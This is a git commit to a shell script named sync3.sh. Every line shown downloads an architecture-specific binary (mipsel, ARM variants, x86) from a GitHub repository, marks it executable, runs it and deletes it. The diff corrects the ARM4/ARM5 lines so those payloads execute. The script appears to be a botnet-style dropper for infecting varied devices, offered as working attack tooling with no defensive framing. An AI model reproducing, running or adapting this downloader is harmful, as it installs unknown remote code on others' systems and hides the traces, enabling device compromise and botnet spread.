8ba3b92b132d4200d0f3d390a3b1ff3a80854d87
davidsantos3825 <davidsantos3825@gmail.com>
2025-04-20 01:28:04 -0300

    Update sync3.sh

--- sync3.sh
+++ sync3.sh
@@ -9,6 +9,6 @@ cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://raw.githu
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.mipsel; chmod +x sync.mipsel; ./sync.mipsel; rm -rf sync.mipsel
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.arm7; chmod +x sync.arm7; ./sync.arm7; rm -rf sync.arm7
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.arm6; chmod +x sync.arm6; ./sync.arm6; rm -rf sync.arm6
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.arm4; chmod +x sync.arm4; ./armv5l; rm -rf sync.arm4
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.arm4; chmod +x sync.arm4; ./armv4l; rm -rf sync.arm4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.arm5; chmod +x sync.arm5; ./sync.arm5; rm -rf sync.arm5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.arm4; chmod +x sync.arm4; ./sync.arm4; rm -rf sync.arm4
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.x86; chmod +x sync.x86; ./sync.x86; rm -rf sync.x86
